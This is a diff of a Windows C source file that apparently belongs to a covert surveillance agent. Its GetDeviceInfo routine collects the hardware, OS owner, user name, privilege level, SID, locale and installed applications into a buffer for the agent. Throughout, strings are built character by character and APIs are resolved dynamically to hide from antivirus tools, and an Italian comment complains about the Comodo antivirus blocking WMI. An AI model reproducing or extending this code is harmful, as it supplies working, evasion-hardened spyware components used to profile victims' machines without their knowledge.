@@ -5,53 +5,14 @@
 #include <Strsafe.h>
 #include "agent_device.h"
 
+#include "utils.h"
 
 PDEVICE_CONTAINER pDeviceContainer = NULL;
-
-#include <Wbemidl.h>
-#include <comdef.h> 
-#include <Shobjidl.h>
-#pragma comment(lib, "wbemuuid.lib")
-
-BOOL ExecQueryGetProp(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField,  LPVARIANT lpVar)
-{
-	BOOL bRet = FALSE;
-	IEnumWbemClassObject *pEnum;
-	
-	BSTR bstrQuery = SysAllocString(strQuery);
-	BSTR bstrField = SysAllocString(strField);
-	
-	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
-	BSTR bWQL = SysAllocString(strWQL);
-	//HRESULT hr = pSvc->ExecQuery(bstr_t(strWQL), bstrQuery, 0, NULL, &pEnum);
-	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
-	if (SUCCEEDED(hr))
-	{
-		ULONG uRet;
-		IWbemClassObject *apObj;
-		hr = pEnum->Next(5000, 1, &apObj, &uRet);
-		if (SUCCEEDED(hr))
-		{
-			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
-			if (hr == WBEM_S_NO_ERROR)
-				bRet = TRUE;
-
-			apObj->Release();
-		}
-	}
-
-	SysFreeString(bstrQuery);
-	SysFreeString(bstrField);
-	SysFreeString(bWQL);
-	
-	return bRet;
-}
 
 
 
 VOID GetDeviceInfo()
 {
-	HKEY hKey;
 	ULONG uLen;
 	PDEVICE_INFO pDeviceInfo;
 	
@@ -65,40 +26,50 @@ VOID GetDeviceInfo()
 	pDeviceInfo = (PDEVICE_INFO)malloc(sizeof(DEVICE_INFO));
 	SecureZeroMemory(pDeviceInfo, sizeof(DEVICE_INFO));
 
-	ULONG uOut;
-	VARIANT pVariant;
 	IWbemLocator *pLoc=0;
 	IWbemServices *pSvc=0;
 
+	BOOL bComAvailable = TRUE;
 	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
-		return;
+		bComAvailable = FALSE;
 	if (!pLoc)
-		return;
+		bComAvailable = FALSE;
 	
-	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
-	BSTR bRootCIM = SysAllocString(strRootCIM);
-	if (FAILED(pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc)))
-	{
-		pLoc->Release();
-		return;
-	}
-	SysFreeString(bRootCIM);
-	
-	if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) != S_OK)
-	{
-		pSvc->Release();
-		pLoc->Release();
-		return;
-	}
-
 	VARIANT vVariant;
-	VariantInit(&vVariant);
-	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_Processor", L"Name", &vVariant) && vVariant.vt == VT_BSTR)
-	{
-		wcscpy(pDeviceInfo->procinfo.proc, vVariant.bstrVal);
-	}
-	VariantClear(&vVariant);
 
+	if (bComAvailable)
+	{
+		do
+		{
+			WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
+			BSTR bRootCIM = SysAllocString(strRootCIM);
+			if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) != WBEM_S_NO_ERROR) // comodo di merda!
+			{
+				pLoc->Release();
+				pLoc = NULL;
+				bComAvailable = FALSE;
+				break;
+			}
+			SysFreeString(bRootCIM);
+
+
+			if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) != S_OK)
+			{
+#ifdef _DEBUG
+				OutputDebugString(L"[!!] CoSetProxyBlanket!\n");
+#endif
+				pSvc->Release();
+				pLoc->Release();
+				bComAvailable = FALSE;
+				break;
+			}
+
+			VariantInit(&vVariant);
+			if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_Processor", L"Name", &vVariant) && vVariant.vt == VT_BSTR)
+				wcscpy(pDeviceInfo->procinfo.proc, vVariant.bstrVal);
+		} while(0);
+		VariantClear(&vVariant);
+	}
 // OK
 	SYSTEM_INFO pSysInfo;
 	memset(&pSysInfo, 0x0, sizeof(pSysInfo));
@@ -114,21 +85,25 @@ VOID GetDeviceInfo()
 	pDeviceInfo->meminfo.memfree = (ULONG)(pMemoryStatus.ullAvailPhys / (1024*1024));
 	pDeviceInfo->meminfo.memload = (ULONG)(pMemoryStatus.dwMemoryLoad);
 		
-	VariantInit(&vVariant);
-	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_OperatingSystem", L"Caption", &vVariant) && vVariant.vt == VT_BSTR)
-		wcscpy(pDeviceInfo->osinfo.ver, vVariant.bstrVal);
-	VariantClear(&vVariant);
+	if (bComAvailable)
+	{
+		WCHAR pSelect1[] = { L'S', L'E', L'L', L'E', L'C', L'T', L' ', L'*', L' ', L'F', L'R', L'O', L'M', L' ', L'W', L'i', L'n', L'3', L'2', L'_', L'O', L'p', L'e', L'r', L'a', L't', L'i', L'n', L'g', L'S', L'y', L's', L't', L'e', L'm', L'\0' };
 
-	VariantInit(&vVariant);
-	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_OperatingSystem", L"CSDVersion", &vVariant) && vVariant.vt == VT_BSTR)
-		wcscpy(pDeviceInfo->osinfo.sp, vVariant.bstrVal);
-	VariantClear(&vVariant);
+		VariantInit(&vVariant);
+		if (ExecQueryGetProp(pSvc, pSelect1, L"Caption", &vVariant) && vVariant.vt == VT_BSTR)
+			wcscpy(pDeviceInfo->osinfo.ver, vVariant.bstrVal);
+		VariantClear(&vVariant);
 
-	VariantInit(&vVariant);
-	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_OperatingSystem", L"RegisteredUser", &vVariant) && vVariant.vt == VT_BSTR)
-		wcscpy(pDeviceInfo->osinfo.owner, vVariant.bstrVal);
-	VariantClear(&vVariant);
-	
+		VariantInit(&vVariant);
+		if (ExecQueryGetProp(pSvc, pSelect1, L"CSDVersion", &vVariant) && vVariant.vt == VT_BSTR)
+			wcscpy(pDeviceInfo->osinfo.sp, vVariant.bstrVal);
+		VariantClear(&vVariant);
+
+		VariantInit(&vVariant);
+		if (ExecQueryGetProp(pSvc, pSelect1, L"RegisteredUser", &vVariant) && vVariant.vt == VT_BSTR)
+			wcscpy(pDeviceInfo->osinfo.owner, vVariant.bstrVal);
+		VariantClear(&vVariant);
+	}
 	
 	// user
 	uLen = sizeof(pDeviceInfo->userinfo.username) / sizeof(WCHAR);
@@ -153,8 +128,6 @@ VOID GetDeviceInfo()
 			pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		
 	
 	
-	
-	
 	CHAR strGetLocaleInfoW[] = { 'G', 'e', 't', 'L', 'o', 'c', 'a', 'l', 'e', 'I', 'n', 'f', 'o', 'W', 0x0 };
 	typedef ULONG (WINAPI *GETLOCALEINFO)(LCID, LCTYPE, LPWSTR, ULONG);
 	GETLOCALEINFO fpGetLocaleInfo = (GETLOCALEINFO) GetProcAddress(LoadLibrary(L"kernel32"), strGetLocaleInfoW);
@@ -165,12 +138,17 @@ VOID GetDeviceInfo()
 	if (!fpGetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, pDeviceInfo->localinfo.country, sizeof(pDeviceInfo->localinfo.country) / sizeof(WCHAR)))
 		pDeviceInfo->localinfo.country[0] = L'\0';
 	
-	LPWSTR strTimeZone = (LPWSTR) malloc(0x1000*sizeof(WCHAR));
-	VariantInit(&vVariant);
-	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_TimeZone", L"Description", &vVariant) && vVariant.vt == VT_BSTR)
-		wcscpy(strTimeZone, vVariant.bstrVal);
-	VariantClear(&vVariant);
-	
+			
+	LPWSTR strTimeZone = NULL;
+	if (bComAvailable)
+	{
+		WCHAR pSelect1[] = { L'S', L'E', L'L', L'E', L'C', L'T', L' ', L'*', L' ', L'F', L'R', L'O', L'M', L' ', L'W', L'i', L'n', L'3', L'2', L'_', L'T', L'i', L'm', L'e', L'Z', L'o', L'n', L'e', L'\0' };
+		strTimeZone = (LPWSTR) malloc(0x1000*sizeof(WCHAR));
+		VariantInit(&vVariant);
+		if (ExecQueryGetProp(pSvc, pSelect1, L"Description", &vVariant) && vVariant.vt == VT_BSTR)
+			wcscpy(strTimeZone, vVariant.bstrVal);
+		VariantClear(&vVariant);
+	}
 	
 	// disk	
 	ULARGE_INTEGER uDiskFree, uDiskTotal;
@@ -219,7 +197,7 @@ VOID GetDeviceInfo()
 	WCHAR strGuest[] = { L' ', L'[', L'G', L'U', L'E', L'S', L'T', L']', L'\0'};
 	WCHAR strAdmin[] = { L' ', L'[', L'A', L'D', L'M', L'I', L'N', L']', L'\0'};
 	WCHAR strFormat[] = { L'C', L'P', L'U', L':', L' ', L'%', L'd', L' ', L'x', L' ', L'%', L's', L'\n', L'A', L'r', L'c', L'h', L'i', L't', L'e', L'c', L't', L'u', L'r', L'e', L':', L' ', L'%', L's', L'\n', L'R', L'A', L'M', L':', L' ', L'%', L'd', L'M', L'B', L' ', L'f', L'r', L'e', L'e', L' ', L'/', L' ', L'%', L'd', L'M', L'B', L' ', L't', L'o', L't', L'a', L'l', L' ', L'(', L'%', L'u', L'%', L'%', L' ', L'u', L's', L'e', L'd', L')', L'\n', L'H', L'a', L'r', L'd', L'D', L'i', L's', L'k', L':', L' ', L'%', L'd', L'M', L'B', L' ', L'f', L'r', L'e', L'e', L' ', L'/', L' ', L'%', L'd', L'M', L'B', L' ', L't', L'o', L't', L'a', L'l', L'\n', L'\n', L'W', L'i', L'n', L'd', L'o', L'w', L's', L' ', L'V', L'e', L'r', L's', L'i', L'o', L'n', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'\n', L'R', L'e', L'g', L'i', L's', L't', L'e', L'r', L'e', L'd', L' ', L't', L'o', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L' ', L'{', L'%', L's', L'}', L'\n', L'L', L'o', L'c', L'a', L'l', L'e', L':', L' ', L'%', L's', L'_', L'%', L's', L' ', L'(', L'%', L's', L')', L'\n', L'\n', L'U', L's', L'e', L'r', L' ', L'I', L'n', L'f', L'o', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'\n', L'S', L'I', L'D', L':', L' ', L'%', L's', L'\n', L'\n', L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L' ', L'L', L'i', L's', L't', L' ', L'(', L'x', L'8', L'6', L')', L':', L'\n', L'%', L's', L'\n', L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L'L', L'i', L's', L't', L' ', L'(', L'x', L'6', L'4', L')', L':', L'\n', L'%', L's', L'\0' };
-	
+	WCHAR strUnknown[] = { L'U', L'N', L'K', L'N', L'O', L'W', L'N', L'\0' };
 
 	StringCbPrintf(pDeviceString, dwSize,	
 		//L"CPU: %d x %s\n"
@@ -242,7 +220,7 @@ VOID GetDeviceInfo()
 		pDeviceInfo->diskinfo.diskfree, pDeviceInfo->diskinfo.disktotal,
 		pDeviceInfo->osinfo.ver, (pDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (pDeviceInfo->osinfo.sp[0]) ? pDeviceInfo->osinfo.sp : L"", (pDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIsx64OS ? str64 : str32,
 		pDeviceInfo->osinfo.owner, (pDeviceInfo->osinfo.org[0]) ? L" (" : L"", (pDeviceInfo->osinfo.org[0]) ? pDeviceInfo->osinfo.org : L"", (pDeviceInfo->osinfo.org[0]) ? L")" : L"", pDeviceInfo->osinfo.id,
-		pDeviceInfo->localinfo.lang, pDeviceInfo->localinfo.country, strTimeZone,
+		pDeviceInfo->localinfo.lang, pDeviceInfo->localinfo.country, strTimeZone ? strTimeZone : strUnknown,
 		pDeviceInfo->userinfo.username, (pDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (pDeviceInfo->userinfo.fullname[0]) ? pDeviceInfo->userinfo.fullname : L"", (pDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (pDeviceInfo->userinfo.priv) ? ((pDeviceInfo->userinfo.priv == 1) ? L"" : strAdmin) : strGuest,
 		pDeviceInfo->userinfo.sid,
 		pApplicationList ? pApplicationList: L"",
@@ -253,10 +231,16 @@ VOID GetDeviceInfo()
 	pDeviceContainer->pDataBuffer = (PBYTE)pDeviceString;
 	pDeviceContainer->uSize = (wcslen(pDeviceString)+1)*sizeof(WCHAR);
 	
-	pSvc->Release();
-	pLoc->Release();
+	if (bComAvailable)
+	{
+		if(pSvc)
+			pSvc->Release();
+		if (pLoc)
+			pLoc->Release();
+	}
 	
-	free(strTimeZone);
+	if (strTimeZone)
+		free(strTimeZone);
 	free(pApplicationList);
 	free(pApplicationList64);
 	free(pDeviceInfo);
